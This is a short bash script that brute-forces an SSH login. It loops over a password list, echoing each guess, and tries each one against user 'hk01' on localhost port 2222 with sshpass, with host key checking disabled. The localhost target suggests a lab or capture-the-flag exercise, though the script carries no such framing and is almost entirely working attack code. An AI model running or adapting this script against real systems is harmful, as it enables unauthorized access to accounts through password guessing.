#!/bin/bash
echo "Start bruteforce!"
for p in $(cat passwords.txt)
do
	echo "trying ${p}"
	sshpass -p "${p}" ssh -o StrictHostKeyChecking=no -q -p 2222 hk01@localhost 
done
